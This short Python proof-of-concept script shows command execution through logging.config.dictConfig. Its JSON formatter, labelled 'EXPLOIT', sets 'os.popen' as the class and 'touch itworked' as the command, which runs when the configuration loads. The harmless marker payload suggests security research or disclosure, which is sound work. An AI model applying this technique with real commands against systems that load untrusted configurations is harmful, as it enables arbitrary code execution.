import logging.config
import json

log_config_txt = '''{
    "version":1,
    "formatters":{
        "EXPLOIT":{
            "class": "os.popen",
            "format": "touch itworked",
            "datefmt": "r",
            "style": 1
        }
    }
}
'''

log_config = json.loads(log_config_txt)
logging.config.dictConfig(log_config)